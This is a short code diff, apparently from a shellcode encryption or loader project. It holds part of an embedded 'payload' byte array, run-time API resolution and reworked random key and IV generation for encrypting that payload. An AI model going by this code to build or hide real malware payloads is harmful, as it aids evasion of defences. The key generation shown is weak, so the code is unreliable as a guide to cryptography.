@@ -59,7 +59,6 @@ unsigned char payload[] =
 "\x1c\xd7\xa5\x7b\x60\x05\x02\x26\xd5\x6c\x43";
 
 
-
 int main()
 {
 	API::APIResolver &resolver = API::APIResolver::GetInstance();
@@ -89,21 +88,37 @@ int main()
 	//ZeroMemory(key, KEYSIZE);
 	//ZeroMemory(iv , IVSIZE);
 
-
 	
+	//tools.PrintConsole((const char*)tools.GetRandomNumber(api));
+
 	if (api.func.pRtlRandomEx)
 	{
-		tools.PrintConsole( "function found in module");
+		tools.PrintConsole("function found in module");
 
-		for (auto x : key)
+		// Fill arrays with random numbers
+		for (auto& x : key) // Use reference to modify the original array
 		{
+			ULONG seed = tools.GetRandomNumber(api); // Use RandomNumber as the seed
 
+			if (!NT_SUCCESS(status = api.func.pRtlRandomEx(&seed)))
+				/*tools.PrintConsole("rtlgenrandom failed");*/
+				return -1;
+			else
+				x = static_cast<unsigned char>(seed);
 		}
 
-		// Create random number
-		if (!NT_SUCCESS(status = api.func.pRtlRandomEx(key, KEYSIZE)))
-			tools.PrintConsole("rtlgenrandom failed");
+		for (auto& x : iv) 
+		{
+			ULONG seed = tools.GetRandomNumber(api);
+
+			if (!NT_SUCCESS(status = api.func.pRtlRandomEx(&seed)))
+				//tools.PrintConsole("rtlgenrandom failed");
+				return -1;
+			else
+				x = static_cast<unsigned char>(seed);
+		}
 	}
+
 	tools.PrintConsole("\n");
 	WriteConsoleA(hConsole, key, 32, &dwWritten, NULL);
 	Sleep(10);
@@ -112,6 +127,7 @@ int main()
 	MessageBoxA(NULL, "end", "", NULL);
 	return 0;
 }
+
 
 bool Encrypt::SimpleEncryption(_In_ void* pPlainTextData, _In_ DWORD sPlainTextSize, _In_ unsigned char* pKey, _In_ unsigned char* pIv, _In_ void** ppCipherTextData, _Out_ DWORD* sCipherTextSize, API::API_ACCESS &api)
 {
